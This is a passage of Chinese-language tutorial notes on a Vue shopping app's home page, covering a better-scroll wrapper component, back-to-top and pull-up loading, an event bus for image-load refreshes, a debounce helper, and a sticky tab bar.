        setTimeout(function() {
          console.log('进来了')
          that.scroll.finishPullUp();
          // console.log(this)
        }, 2000)
      })
    }
  }
  </script>

  <style scoped>
    .wrapper {
      height:200px;
      background:deeppink;
      overflow-y:hidden;
    }
  </style>
 -->

> 注意:
- 弹幕上有这么写
<!-- 
  this.scroll = new BScroll(this.$refs.wrapper, {
    probeType:2,

    // 如果元素是button 不管true还是false都可以点击 但是如果是div之类的就要设置这个选项
    click:true,         
    mouseWheel:true,
    observeDOM: true
  })
 -->

- 弹幕上还说 当因图片的问题 没办法判断到没到底部的时候我们可以加上这个属性
<!-- 
  observeImage: true
 -->

--------------------------

### Better-scroll 在vue项目中使用过程
- 上面了解了 怎么使用better-scroll 接下来我们看看怎么在home.vue组件中 对 可滚动的区域进行重构 (除了导航最上面的nav-bar的位置其它的部分都需要滚动)

- 1. 在home.vue组件中 引入 better-scroll
- 2. 在mounted函数中创建better-scroll的实例 
- 3. 创建wrapper 创建content 将所有组件放在content中 并且给wrapper指定一个高度
<!-- 
  <div class='wrapper'>     // 指定高度
    <div class='content'>
        ..所有组件..
    </div>
  </div>
 -->

- 上面讲了一下大概的流程 但是 better-scroll毕竟是一个第三方的库, 如果有一天停止维护 仍然会出现之前我们说过的话题 所以我们还是要对better-scroll进行层封装

- 然后让 better-scroll --面向-- 封装文件 --面向-- 所有组件
- 我们会封装成一个.vue文件, 之后所有涉及到滚动的组件 都使用.vue文件就可以了

--------------------------

### Better-scroll 的封装 以及 使用
- 上面提到了封装 我们要给它封装到components -- common里面 这样以后的文件中也可以进行复用
<!-- 
  | - components
    | - common
      | - scroll
        - Scroll
 -->

- 我们在上面的目录里创建了 Scroll.vue 文件 以后只要是有想滚动的部分 我们就可以放入<scroll> 各种组件 </scroll>
- 我们在组件中使用组件scroll的时候需要给scroll组件指定一个高度, 因为每个页面中 需要滚动的区域的高度是不一样
- 这样每个组件在使用<scroll>组件的时候, 可以通过加class设置滚动区域的高度
<!-- 
  <scroll class='content'>

  </scroll>

  <style>
    .content {
      height: 我们指定一个高度 也就是定义一个可滚动的区域
    }
  </style>
 -->


- 这里复习一个下插槽被替换的时候是什么样子的
<!-- 
  <div>
    <slot></slot>
  </div>

  <组件1> </组件1>
  <组件2> </组件2>

  使用插槽的时候 <slot> 会被内容完全的替代掉

  <div>
    <组件1> </组件1>
    <组件2> </组件2>
  </div>
 -->


- 因为slot的部分会被完全的替换掉, 而better-scroll的使用需要 包裹 包裹里面只能有一个子元素 因为结构的关系 我们要像下面这么定义 <template>
<!-- 
  <template>
    <div class="wrapper">
      <div class="content">
        <slot></slot>
      </div>
    </div>
  </template>
 -->


- 知道了上面的结构是什么样子的 接下来我们就要把需要滚动的组件放到插槽里面
<!-- 
  <scroll class='content'>
    <home-swiper :banners="banners"></home-swiper>
    <recommend-view :recommends="recommends"></recommend-view>
    <feature-view></feature-view>
    <tab-control
      :titles="['流行', '新款', '精选']"
      class="tab-control"
      @tabClick="tabClick"
    ></tab-control>
    <goods-list :goods="showGoods"></goods-list>
  </scroll>
 -->

- 然后 我们需要给 <scroll> 指定一个可以滚动的区域
- 这里 除了顶部的<nav-bar> 和 底部的<tab-bar>剩下的都是可滚动的区域
<!-- 
  页面高度 - 顶部 - 底部

  这里有两种解决的方案
  // 方案一, 利用 css 中 calc()
  .content {
    height: calc(100vh - 93px); 
  }

  // 方案二, 利用 position absolute
  假如我们不指定高度的时候 高度默认就是自动
  .content {
    position:absolute;
    top:44px;           需要减去的顶部的高度
    bottom:49px;        需要减去的底部的高度
    left:0;   
    right:0;
  }
 -->

--------------------------

### 首页开发 - BackTop组件的封装和使用
- 首页的开发几乎快完成了, 我们再补充一些功能, 比如在滚动到某一个位置的时候 显示回到顶部按钮
- 我们把这个功能封装在components -- content 里面

- 我们创建一个<back-top>组件 放在<scroll>组件的外面 因为这个<back-top>组件不需要一起滚动
- 而且每一个页面中<back-top>组件的位置都是一样 所以 <back-top>组件 的样式在该组件内部定义就可以
<!-- 
  当同一样式 就是在组件内部修改 css
  当不统一样式的时候, 在哪个组件内使用就在哪个组件修改css样式

  // BackTop组件
  <template>
    <div class="back-top">
      <img src="~assets/img/common/top.png" alt="">
    </div>
  </template>


 -->

- 上面修改完样式 位置后 我们需要完成点击该按钮 返回顶部的功能
- 我们想想这个功能在哪完成比较好?
- 位置1. 在 BackTop.vue 里
- 位置2. 在 home.vue 里
<!-- 
  回到顶部的功能 我们需要调用better-scroll中的创建的scroll实例对象的scrollTo()方法来完成
  我一开始想是在 1 里面完成比较好, 但事实上却是比较麻烦 相当于在BackTop.vue监听点击事件 却操作Scroll.vue中的代码
  倒是也能实现

  位置1 实现方式
  // BackTop.vue
  <div class="back-top" @click='backClick'>
  </div>
    我们给div绑定点击事件

  methods: {
    backClick() {
      this.$emit('backClick');
    }
  }
    然后我们把事件发送出去 并在父组件(home.vue)中接收

  // 父组件 home.vue
  <back-top @backClick='backClick'></back-top>
    然后我们在父组件中定义处理方法, 想办法拿到scroll组件中的实例对象 通过调用这个实例对象的方法实现返回顶部的功能

  但是像这样的话 不太好, 就重复了
 -->

- 既然 位置1 不好操作 不如我们直接在 home.vue 中监听 <back-top> 组件的点击 因为这个组件就是小按钮不是么
- 这样的就不需要在<back-top>组件发送$emit了
<!-- 
  我们知道元素肯定是能添加各种事件的, 但是组件可以么?
 -->

**但是组件是不能直接绑定事件的, 如果需要比如添加 @事件名.native 修饰符**
<!-- 
  Vue3.0中已经删除.native修饰符, 可以直接给组件绑定事件
 -->

> 怎么在父组件中获取到子组件中的对象
- 通过
- <标签 ref='属性名'>   this.$refs.属性名 的方式

<!-- 
  // home.vue
  <back-top @click.native='backClick'></back-top>
      使用 .native 给组件绑定事件

  <scroll class='content' ref='scroll'>
      也是在home.vue组件中, 在组件标签内 写了 ref='' 的方式获取该组件对象

  backClick() {
    上面我们给<scroll>组件 添加了ref属性, 那么这里我们就可以拿到该组件对象
    通过 this.$refs.scroll 的方式 拿到了 Scroll.vue 组件
    Scroll.vue 中的 data 里面有 scroll属性, scroll属性绑定了 BScroll 对象 也就是说scroll是BScroll的实例对象
    那我们就可以调用scroll.scrollTo()方法
    -----

    this.$refs.scroll.scroll.scrollTo(0, 0, 500)

    -----
    但是 this.$refs.scroll.scroll.scrollTo(0, 0, 500) 有点让人很不好理解 我们可以 在Scroll.vue中封装一个方法
    methods: {
      scrollTo(x, y, time=300) {
        this.scroll.scrollTo(x, y, time)
      }
    }
    然后我们在home.vue组件中可以通过 this.$refs.scroll组件对象直接获取组件中的方法和属性
    这就是封装的思想
    -----

    this.$refs.scroll.scrollTo(0,0,500);
  },
 -->

--------------------------

### 首页开发 - BackTop的显示和隐藏
- 我们观察做好的页面会发生, 当我们滚动屏幕的时候 这个组件会在某个临界值的时候显示 或者 隐藏

- 思路:
- 我们需要实时的监听滚动 比如滚动超过1000px的时候显示, 小于1000px的时候隐藏
- 既然需要实时的监听滚动区域的滚动, 那么我们就要在 Scroll.vue 中开启监听滚动
<!-- 
  this.scroll = new BScroll(this.$refs.wrapper, {
        probeType:3,        // 先定义监听滚动的属性
        click:true,
        mouseWheel:true,
        observeDOM: true,

    }),

    // 2 监听滚动的位置 绑定scroll事件
    this.scroll.on('scroll', (position) => {
      
    })
 -->

- 但是在Scroll.vue中这么设置并不是很好, 因为在本组件中设置的话 更改的是通用, 以后在别的地方调用该组件的时候 也是开启了监听实时滚动的效果, 但是并不是所有调用该组件的都希望有实时监听滚动的功能
<!-- 
          封装的 Scroll 组件
        ↙                   ↘
    A组件                     B组件

    需要实时监听              不需要实时监听

    所以在 Scroll.vue 里面不适合开启实时监听页面滚动
    probeType:3
 -->

- 我们可以这样, 让调用该组件的人决定 需要不需要开启实时监听
- 同时 我们通过this.$emit()需要将 position 传递出去, 谁想用谁用
<!-- 
  // Scroll.vue 组件
  props: {
    proType: {
      type: Number,
      default:0
    }
  },

  mounted() {
    this.scroll = new BScroll(this.$refs.wrapper, {

        // 这里我们设置的默认值是0, 具体的值让父组件传递过来
        probeType:this.proType,
        click:true,
        mouseWheel:true,
        observeDOM: true,

    }),

    // 2 监听滚动的位置
    this.scroll.on('scroll', (position) => {

      // 我们这个position并不是在Scroll.vue组件里面使用的, 我么需要将position传递出去
      console.log(position)

      // 这样我们就将position传递出去了, 之后谁想后这个东西, 谁就去接收
      this.$emit('scroll', postion)
    })
 },

  
  // 在父组件中
  <scroll class='content' ref='scroll' :probe-type='3' @scroll='contentScroll'>
    :probe-type='3'
    在父组件中 使用v-bind传递过来 传递3相当于开启了实时监听滚动

    @scroll='contentScroll'
    用来接收子组件中传递过来的position

  contentScroll(position) {
    console.log(position)

    // 这里面做显示隐藏的逻辑
    position.y > 1000 or < 1000
  },
 -->

> 总结:
- 只要是让父组件决定的属性 我们使用props定义个变量, 这个变量不仅仅在DOM模板中使用, 还能在实例中当做属性使用


- BackTop.vue组件的显示和隐藏
- <back-top @click.native='backClick' v-show='isShowBackTop'></back-top>
- 我们可以给这个组件 使用v-show 绑定一个变量 根据变量决定这个组件的显示和隐藏
<!-- 
  我们在data里面定义变量
  data() {
    return {
      isShowBackTop:false
    }
  }

  v-show='isShowBackTop';

  当滚动到某一个位置的时候 我们就改变 isShowBackTop 为 true


  // home.vue 父组件中
  // position.y 是负数 我们前面加个 - 
  contentScroll(position) {
    this.isShowBackTop = (-position.y) > 1000
  },

 -->

--------------------------

### 首页开发 - 完成上拉加载更多
- 这个模块我们完成以下 上拉加载 更多
- 也是需要监听滚动事件吧, 在Scroll.vue里开启上拉加载更多的属性
- 也是这个上拉加载更多的属性, 不一定是每一个组件里都需要使用 所以我们也不要直接定义 pullUpLoad:true, 最好也是 把它定义一个变量 谁调用的时候 谁再确定是否需要开启这个功能
<!-- 
  // 子组件 Scroll.vue
  pullUpLoad: {
    type: Boolean,
    default: false
  }

  this.scroll.on('pullingUp', () => {
    console.log('上拉加载更多');
    this.$emit('pullingUp')
      使用$emit将事件单独的发射出去
  })




  // 父组件 home.vue
  <scroll class='content' 
      ref='scroll' 
      :probe-type='3' 

      // 注意 这里将驼峰改成 - -
      @scroll='contentScroll' :pull-up-load='true'    

      // 这里接收子组件中传递的事件
      @pullingUp='loadMore'
    >

    loadMore() {
      console.log('上拉加载更多');

      // 这里针对现在的类型加载更多的对应的数据 选中谁给对应的分类做上拉加载更多的逻辑
      加载谁 currentType就记录着谁 一旦调用了这个方法就会取出当前页面让页面+1 载完一次以后 必须调用scroll.finishPullUp()告诉better-scroll一次加载完成
      this.getHomeGoods(this.currentType);
      
    },


    // 因为 scroll.finishPullUp(); 方法是在数据加载完成后 写上, 所以在请求数据的函数里书写
    getHomeGoods(type, page).then((res) => {

        this.goods[type].list.push(...res.data.list);
        this.goods[type].page += 1;

        // 加载数据完成后 需要调用scroll.finishPullUp()方法 告诉betterscroll一次加载完成
        this.$refs.scroll.scroll.finishPullUp();

        // 但是上面的可读性比较差, 我们对这个方法在scroll.vue中再做一层封装

      });


  // 子组件 Scroll.vue 里
  methods: {
    scrollTo(x, y, time=300) {
      this.scroll.scrollTo(x, y, time)
    },
      
    // 我们对finishPullUp方法做一层封装
    finishPullUp() {
      this.scroll.finishPullUp()
    }
  }
-->

> 总结:
- this.$emit() 不仅仅是传递参数 还是可以单独的传递事件

- 上面完成了子组件将上拉加载更多的事件发射到了父组件中处理(数据在父组件啊, Scroll.vue组件也是公共的不能处理只属于home的逻辑, 所以我们将事件发送出去)


- 上面的滚动还是有些问题, 因为有的时候页面突然不能滚动了 原因是因为scroll插件计算出来的 和我们用到的高度不一样
<!-- 
  原因:
  当我们使用better-scroll创建简单的滚动的时候 不会产生bug

  但是现在比较复杂
  因为better-scoll要计算可滚动的高度(内容的高度 - wrapper的高度)

  但是我们的情况又比较复杂, 因为我们的内容是一个个的小组件, 当我们最开始给better-scroll的时候图片还没有加载出来 因为图片是异步加载的 所以better-scroll在计算一个小的item组件的时候 是不包含图片的

  所以better-scroll在计算整个内容区的高度的时候是不包含图片的
  比如 它计算出来的是 height:2000
  但是后面我们的图片加载过来了 也就意味着每一个小的item被撑高了 最终整个的内容区域就会变的很多 但是better-scroll并不会重新计算的

  所以我们应该先监听图片加载完 然后调用refresh()方法重新计算高度
 -->
    
--------------------------

### 首页开发 - 滚动区域的Bug分析和解决
- 我们这里要完成的逻辑是, 一旦图片加载完成, 我们调用 scroll.refresh()方法
- 思路:
- better-scroll在决定有多少区域可以滚动时, 是根据scrollHeight属性决定
  - scrollerHeight属性是根据放在better-scroll的content中的子组件的高度决定的
  - 但是我们的首页中, 刚开始在计算scrollerHeight属性时, 是没有将图片计算在内的, 所以计算出来的高度是错误的
  - 后来图片加载进来之后有了新的高度, 但是scrollerHeight属性并没有进行更新所以滚动出现了问题

- 解决方式
- 监听每一张图片是否加载完成, 只要有一张图片加载完成了, 就执行一次refresh()

- 如何监听图片加载完成了?
<!-- 
  原生js中 img.onload = function() {  }
  但是在vue中不用这样
 -->

- 我们需要监听图片加载完成了没 图片在哪里?
- components -- content -- goods -- GoodsListItem.vue中
- 使用 @load 事件 就是 原生的img.onload事件

>Vue @load 
- 图片每加载成功一次 就会调用这个方法一次
<!-- 
  <img :src="goodsItem.show.img" alt="" @load='imgLoad'>

  methods: {
   // 一旦图片加载完成 就会执行这个函数 每加载一次就会调用这个函数一次
   imgLoad() {

     // 在这里调用scroll的refresh()方法 但是这个组件中没办法直接获取到scroll组件对象

   }
 }
-->

- 我们现在遇到的问题就是, 我们先看下组件的结构
<!-- 
  | - home.vue
    | - Scroll.vue                2. 拿到这个组件对象
    | - GoodsList.vue             ↑
      | - GoodsListItem.vue       1. 我们需要在这里

  1. 中拿不到 scroll组件对象, 但是home.vue里面可以拿到 所以
-->
  
  
> 解决办法1   组件之间的层层传递
- 我们将事件从GoodsListItem传递到GoodsList再传递home里面
<!-- 
   GoodsListItem.vue   -- >   GoodsList.vue   -- >   home.vue
 -->

- 上面的思路会有一些麻烦 因为组件之间的层层传递有点麻烦


> 解决办法2   VueX
- 我们利用 vuex 来解决, vuex里面记录的是状态, 那么每当GoodsListItem中图片加载完成一次以后 我们就改变 vuex 中定义好的一个变量

- 同时在home.vue中引用vuex中的这个变量, 在实时监听这个变量 一旦这个属性发生改变的时候, 我们就执行 scroll.refresh()

<!-- 
  home.vue        vuex            GoodsListItem.vue
  监听变量,       定义变量         每当加载成功图片一次 就修改vuex变量一次
  变量一旦改变
  执行 refresh
  一次 

  因为 每一个组件都能通过 this.$store 访问到vuex中的属性 和 方法  
 -->
  

> 解决方式3   事件总线  this.$bus.emit('事件名')
- 有一个地方 是共用的 叫做 事件总线(我们用vue实例充当事件总线)

>>> 事件总线的创建  
> Vue.prototype.$bus = new Vue()
- main.js文件 --- 给vue原型添加$bus 并赋值vue实例
<!-- 
  // main.js文件中
  我们给vue的原型添加一个$bus, 添加的$bus是一个空的对象, 没办法发射事件对吧
  因为我们下面是用this.$bus.emit() 发射事件 但是$bus是刚创建的对象, 空的吧 哪来的emit()方法, 所以 我们可以这个$bus赋值为 Vue实例

  Vue实例是可以做事件总线的
  Vue.prototype.$bus = new Vue()

  之后我们就可以使用vue发射事件和监听事件
 -->


- 组件1 通过 this.$bus.$emit('事件名') 发射事件到 事件总线
- 组件2 通过 this.$bus.$on('事件名', function() { }) 来监听 事件总线中的 事件, 回调中处理
<!-- 
  注意是 $on $emit
 -->

- 跟vuex很像, 但是事件总线不是用来管理状态的 是用来管理事件的

- 事件总线的简单应用
<!-- 
  组件1
  this.$bus.emit('aaa')    将aaa事件发送的事件总线里面

  组件2
  this.$bus.on('aaa', function() {
    组件1中发射到 事件总线的事件, 会在这个回调中监听到
  })
 -->


- 回过头来看看我们的项目
<!-- 
  // GoodsListItem.vue中
  <img :src="goodsItem.show.img" alt="" @load='imgLoad'>

  methods: {
    imgLoad() {
      // 我们将 imgLoad 发射出去 发射到事件总线, 事件总线也是一个公共的区域这样别的组件就可以通过事件总线 获取我们发射到事件总线的事件
      this.$bus.$emit('imgLoad')
    }
  }


  // home.vue中
  created() {
    // 我们在created中监听, 一旦组件创建完毕 我就等着监听imgLoad事件 监听GoodsListItem中的图片加载完成
    this.$bus.$on('imgLoad', () => {

      // 每加载完成一个图片后 重新计算一下滚动内容区的高度
      this.$refs.scroll.refresh();
    }),
  }
 -->

> 总结:
- 当事件的传递 组件之间隔着层级太远, 我们可以使用事件总线的方式

- 事件总线包含了3部分代码
- 1. Vue.prototype.$bus = new Vue()    // main.js 中
- 2. this.$bus.$emit('事件名称', 参数)
- 3. this.$bus.$on('事件名称', function(参数) { })
<!-- 
  注意 Vue3中 emit on前面是不需要加$的
 -->

**注意：**
- 这里只是说了怎么获取数据 也就是传递数据 比如A如何给B数据
- 但是假如B想修改A里面的数据那怎么办？
<!-- 
  一样 B要往事件总线发送一个事件 同时将要修改的值带过去
  A要监听事件总线里面对应的事件 拿到值来做修改

  也就是说我们要返过来使用一遍事件总线的逻辑
 -->

- 当组件太多的时候 再使用事件总线就太乱了 也太麻烦了 而且尤其是涉及到读写的时候

--------------------------

### refresh函数找不到的bug处理
- 我们通过上面的方法使用refresh()的时候 可能会报错

> 问题可能性1
<!-- 
  cannot read property refresh of undefined

  原因可能是 GoodsListItem中的图片来的太快了 当我们使用scroll.refresh()的时候, Scroll.vue组件还没有挂载

  home.vue    --   GoodsList   --   GoodsListItem

  // GoodsListItem中:
  我们对img @load 监听了图片的加载
  然后通过 this.$bus.$emit() 发射事件



  // home.vue中
  这里我们监听 GoodsListItem 发射出来的事件
  在监听的回调中 每成功加载一张图片 我们就在回调用 调用
  this.$refs.scroll.refresh()

  我们在调用refresh()的时候 内部是 拿到 Scroll.vue 组件对象, 调用了组件对象内部的方法

  而refresh()这个方法是在Scroll组件里面的



  // Scroll.vue
  我们初始化scroll对象的时候是在mounted里面

  
  上面报错的原因是 GoodsListItem 的图片来的太快了 在Scroll.vue还没有挂载之前就请求回来图片了 请求图片加载完成后就会马上去home.vue中的@load中的回调里执行scroll组件对象的方法, 但是scroll组件这时候还没有初始化完成 没初始化完成就代表是从undefined 或者 null上读取了refresh()方法 所以会报错
 -->

> 当有上面的情况的时候 我们可以这么写
- this.scroll && this.scroll.scrollTo(x, y, time)
- 当有这个对象的时候 再调用它的方法
<!-- 
  // Scroll.vue

  methods: {
   scrollTo(x, y, time=300) {
     this.scroll && this.scroll.scrollTo(x, y, time)
   },

   finishPullUp() {
     this.scroll && this.scroll.finishPullUp()
   },

   refresh() {
     this.scroll && this.scroll.refresh()
   }
 }
 -->


> 问题可能性2
- 我们关于 图片监听的处理函数 是在home.vue的created中的书写的
- 在 created 中去拿dom结构中的对象 可能是拿不到的
- this.$refs.scroll 下面我们就使用了 this.$refs 相当于 document.getElementById去拿是一样的 都是在created中去拿dom中的对象 有可能是拿不到的因为created是阶段是拿不到dom节点的
<!-- 
    this.$bus.$on('imgLoad', () => {
      this.$refs.scroll.refresh();
    }),
 -->

- 综上 监听图片的加载事件要在mounted中去做

--------------------------

### 刷新频繁的防抖函数处理
- 报错的问题解决了之后 我们再说说 home.vue组件中的 图片监听事件 里面存在的刷新太过频繁的问题
- 我们希望1秒钟内如果有多次调用只调用一次 1秒钟内如果有下一次的调用就等一会
<!-- 
  this.$bus.$on('imgLoad', () => {

    // 这里面的逻辑调用的太频繁了
    
  }),
 -->

- 比如说我们现在要开发一个搜索的功能, 我们在输入框内输入一个字母, 它就会想服务端发送一次请求, 请求过来的结果在输入框的下面做展示
- 但是有些时候 用户输入过快, yifu 这样会往服务器发送4次请求 其实没有必要, 所以一般这个时候 我们就会给它做一个防抖动操作
<!-- 
  用户输入一个y 然后本来想准备向服务器发送请求, 但是先不发等待100ms 看看用户是不是继续输入, 如果继续输入那就把y的那次请求取消掉 yi
  到yi后看看用户有没有继续输入 知道用户过了100ms没有输入 我们再发送网络请求

  这就是防抖函数 在设定的时间内只触发一次, 如果有多次就取消上一次的请求等到时间后重新发送


  放到我们的项目里也是一样的, 一张图片加载完成后先等500ms如果500ms内没有新的图片加载完成就调用refresh()方法, 如果有图片加载完成就停止调用refresh()等500ms之后一起调用refresh()方法

  节流通常用在轮播图
 -->

- 我们看看代码上的体现
- 防抖函数起作用的过程
  - 如果我们直接执行refresh, 那么refresh函数会被执行30次
  - 我们可以将刷新操作的函数refresh()放入 debounce防抖函数中 生成给一个新的函数
  - 之后在调用非常频繁的时候, 就使用新生成的函数, 而新生成的函数, 并不会非常频繁的调用, 如果下一次执行来的非常快, 那么就将上一次取消掉
<!-- 
  mounted() {

    // 下面的函数是监听GoodsListItem组件中图片加载的情况, 在没有防抖的操作之前 它的内部会调用30次的刷新操作
    this.$bus.$on('imgLoad', () => {

      // 我们将下面这个代码放入防抖函数中 并在这个位置执行防抖函数
      this.$refs.scroll && this.$refs.scroll.refresh();
    })
  },


  // 防抖函数
  debounce(func, delay) {
      let timer = null;
      return function(...args) {
        // 判断上面的timer有没有值 如果有值的话就清除掉
        if(timer) {
          clearTimeout(timer)
          timer = setTimeout(() => {
            func.apply(this, args)
          }, delay)
        }
      }
    },
 -->

> 完整的代码部分:
<!-- 
  // home.vue中
  mounted() {
    // this.$refs.scroll.refresh是不加小括号的
    const refresh = this.debounce(this.$refs.scroll.refresh, 100)
    this.$bus.$on('imgLoad', () => {
      refresh()
    })
  }

  // home.vue methods中定义的防抖函数
  debounce(func, delay) {
    let timer = null;

    return function(...args) {
      // 判断上面的timer有没有值 如果有值的话就清除掉
      if(timer) {
        clearTimeout(timer)
      }
      timer = setTimeout(() => {
        func.apply(this, args)
      }, delay)
    }
  },
 -->


> 知识点
- 1. setTimeout在下一次事件循环的时候执行 这个函数会被放到最后执行

- 2. 引入utils.js中的方法函数的时候, 再调用的时候不用加this, this指向组件内的实例, 如果不加this就去找公共的方法
<!-- 
  this.debounce   在组件实例里面找这个方法
  debounce        会看有没有引入哪个模块中有这个方法
 -->

--------------------------

### 首页开发 --- 上拉加载更多的完成
- 上面我们在home.vue组件中对, 对图片加载的函数做了性能上的优化, 我们做了防抖
- 但是像防抖这种功能性的函数不在单独的放在一个组件里面
- 我们在common -- utils 创建这个js文件
<!-- 
  // utils.js中
  // 防抖函数
  export function debounce(func, delay) {
    let timer = null;
    return function(...args) {
      if(timer) {
        clearTimeout(timer)
      }
      timer = setTimeout(() => {
        func.apply(this, args)
      }, delay)
    }
  }
 -->

- 上拉加载更多的逻辑已经做完了 在上节的上节?

--------------------------

### tabControl的offsetTop获取分析
- 首页接下来只剩下一个 流行 新款 精选 按钮的吸顶效果
<!-- 
  之前我们是使用 粘滞定位 但是现在已经不起效果了

  .tab-control {
    position: sticky;
    top: 44px;
    z-index: 10;
  }
 -->

- 我们要判断 这个按钮栏整体的滚动位置
<!-- 
  比如我们往上滚动了500px 我就判断滚动的距离是不是>500 如果大于500 这个时候要做吸顶, 那就改变为fixed
 -->

> 具体步骤
>>> 要点:
- 1. this.$refs.组件对象.$el 拿到组件内的根元素(div)部分


> 1. 必须知道滚动到多少时, 开始有吸顶效果 
- 也就是说 我们滚动到目标对象的offsetTop值的时候开始有吸顶效果
- 这个时候就需要获取tabControl的offsetTop
- 但是 如果直接在mounted中获取tabControl的offsetTop 那么值是不正确的
- 如果火证正确的值呢?
  - 监听HomeSwiper中的img的加载完成
  - 加载完成后, 发出事件, 在home.vue中 获取正确的值
    - 补充 为了不让HomeSwiper多次发出事件
    - 可以使用isLoad的变量进行状态的记录

<!-- 
    ------ 顶部 ------
      ^
      ^   offsetTop   400px
      ^
      div

  那就是说滚动过了400px的时候 要有吸顶的效果
 -->

- 怎么才知道offsetTop值? 
<!-- 
  获取到tabControl的offsetTop

  1. 我们在data中定义一个变量 用来保存offsetTop
      tabOffsetTop: 0

  2. 既然要获取offsetTop 那就要拿到这个组件对象 就像我们要获取div到顶部的距离也得拿到div对象 vue中我们通过ref来获取 
      ref='tabControl'   this.$refs.tabControl

  3. 在mounted中 我们拿到组件对象, 将offsetTop的值赋值给tabOffsetTop
      this.tabOffsetTop = this.$refs.tabControl 
    
    this.$refs.tabControl 拿到的是组件对象 并不是dom对象, 比如div有offsetTop数据, 那么组件对象有offsetTop属性么? 没有

    那么我们只能拿到组件里面的对应元素就可以了
    <template>
      <div class='tab-control'>     我们拿到组件对象中的div就可以了吧 
      </div>
    </template>

    拿到里面div div才有offsetTop吧

    // 在home.vue
    mounted() {
      this.tabOffsetTop = this.$refs.tabControl.$el.offsetTop
      console.log(this.tabOffsetTop)    // 80
    }

    上面我们在mounted中获取的数据肯定不准 80px 太小了, 原因是因为 我们虽然在mounted中进行操作的 但是页面里面的图片还没有加载完毕, 所以这时候得到的位置是不准确的 值也就是不准确的

    所以我们要在图片加载完成后 再去获取这个值才是准确的
 -->

- 上面在mounted中获取目标对象的offsetTop是不准确的 解决办法
- 1. 我们再次监听图片加载情况 加载完毕后再来获取offsetTop值
<!-- 
  这个项目里面 tabControl组件上面 有3个部分有图片

  轮播图

  4个圆圈小图片

  本周流行的大图


  老师测试完毕 主要产生印象的还是轮播图的部分, 下面的两个部分并不会产生太大的影响
 -->

- 2. 这里我们主要监听一下轮播图的加载完成情况
<!-- 
  1. 我们去轮播图的组件里面
      home -- childComps -- HomeSwiper.vue中

    <a :href="item.link">
      <img :src="item.image" @load='imageLoad'/>     我们给它绑定@load事件
    </a>

    methods: {
      imageLoad() {
        在这里我们把这个事件发送出去 让home.vue去做处理
        this.$emit('swiperImageLoad')
      }
    },


  2. home.vue组件中
  <home-swiper :banners="banners" @swiperImageLoad='swiperImageLoad'></home-swiper>

  methods: {
    // tabControl 监听轮播图的图片加载情况
    swiperImageLoad() {
      // 获取tabControl组件 然后将tabControl组件上面的偏移量给到tabOffsetTop保存起来
      this.tabOffsetTop = this.$refs.tabControl.$el.offsetTop
      console.log(this.tabOffsetTop)    // 这里面记住图片就打印几次

      在这里我们只需要获取一次正确的值就可以了
    },
  }

  因为每加载图片成功一次 HomeSwiper组件中就会发射事件一次, 一共4张图片就发射了4次事件

  但是对于高度来讲, 我们只需要知道一张图片的高度就可以了, 所以HomeSwiper组件里只需要发射一次事件就可以

  >>> 注意 在@load里面的就是图片加载后的状态
 -->


- 3. 让 HomeSwiper组件 只发射一次事件
<!-- 
  data() {
    return {

      // 这里定义一个变量
      isLoad: false
    }
  },

  imageLoad() {
    // 这里只需要发射一次事件可以
    // 先取反让它进入判断发射一次事情 然后修改变量让它进不来
    if(!this.isLoad) {    
      this.$emit('swiperImageLoad')
      this.isLoad = true
    }
  }
 -->

- 弹幕说 获取正确的值的话 还可以在setTimeout里面做 这样是异步会等同步完成后再获取值? 好像也行啊


> 监听滚动 动态的改变tabControl的样式
- 之前我们做backTop组件什么时候显示和隐藏 在methods中定义了一个函数
- 我们可以在这个函数中 继续完成tabControl是否吸顶的逻辑
<!-- 
  // 关于backTop组件显示和隐藏的函数
  contentScroll(position) {
    // 1. 判断backTop组件是否显示
    this.isShowBackTop = (-position.y) > 1000

    // 2. 决定tabControl是否吸顶(position:fixed)
    我们先在data中定义一个变量 isTabFixed: false 默认false
    this.isTabFixed = (-position.y) > this.tabOffsetTop
        - 通过滚动 和 offsetTop 的值的比较决定 data中isTabFixed变量的值
        - 我们根据位置关系动态决定变量的值
        - 然后根据变量的值 动态决定css样式position: fixed 动态绑定calss
  },


  <tab-control
    :titles="['流行', '新款', '精选']"
    class="tab-control"
    @tabClick="tabClick" 
    ref='tabControl' 
    :class='{fixed:isTabFixed}'       我们这里动态绑定class
  ></tab-control> 

  当isTabFixed为true的时候绑定这个class 为false的时候不绑定
 -->

- 上面出现了两个问题
- 1. Scoll组件里 关于监听滚动的部分 加上if判断后 home.vue组件中读不到position的值

- 2. 我们通过定义变量isTabFixed让它控制是否让tabControl组件fixed 但是因为fixed后脱离了文档流, 下面的结构会一下子上去

- 3. 因为better-scroll是理论是改变transform的translatey 虽然我们给组件fixed的 本应该定位在屏幕上的一个位置, 但是translatey还是可以改变fixed的位置的 fixed的状态 随着屏幕的滚动到滚动走了

- 上面的问因为better-scroll的原因 class的fixed的方式行不通
- 那我们就不能采用 class fixed的方法了


> 解决方式
- 我们将 <tab-control> 组件复制一份到 <scroll> 组件的外面
<!-- 
  界面上有两个 <tab-control> 组件 了
  上面这个组件先隐藏 当滚动到一定位置后 显示, 其实下面的组件会随着better-scroll滚到上面去
 -->

- 也就是说在滚动区域的外面 然后对这个 <tab-control> 组件使用v-show
- 也就是说 默认它是隐藏的 当滚动的距离大于下面的的offsetTop的时候 我们动态的修改了 isTabFixed 变量的值
<!-- 
  <tab-control
    :titles="['流行', '新款', '精选']"
    class="tab-control"
    @tabClick="tabClick"
    ref="tabControl" 
    v-show='isTabFixed'     根据isTabFixed的值显示或者隐藏
  ></tab-control>
 -->

- 但是上面还有另一个问题 现在界面上有两个<tab-control>组件 
- 我们分别叫做 上组件 和 下组件 当我们点击下组件的新款按钮后 开始滚动 滚动到一定位置 上组件显示 但是上组件展示的 按钮内容 和下组件的不一致
<!-- 
        上组件:   流行    新款    精选
                -------


        下组件:   流行    新款    精选
                        -------

  也就是说下组件点击了什么 跟 上组件不能同步
 -->

- 那怎么让两个东西保持一致呢?
- 只要我们能拿到<tab-control>组件 这个组件中有一个变量记录着谁被选中的
- currentIndex
<!-- 
  1. 我们给上组件 绑定 ref='tabControl1'    下组件的ref还是tabControl
  2. 我们去methods中找到关于 点击组件的处理函数 tabClick

    tabClick(index) {

      switch (index) {
        case 0:
          this.currentType = "pop";
          break;
        case 1:
          this.currentType = "new";
          break;
        case 2:
          this.currentType = "sell";
          break;
      }

      // 这里处理逻辑
      // 为了让上组件 和 下组件 的点击效果同步 我们将 index 传递给 上组件的currentIndex
      // 两个组件都要设置 因为都要互相同步
      this.$refs.tabControl1.currentIndex = index
      this.$refs.tabControl.currentIndex = index
 -->
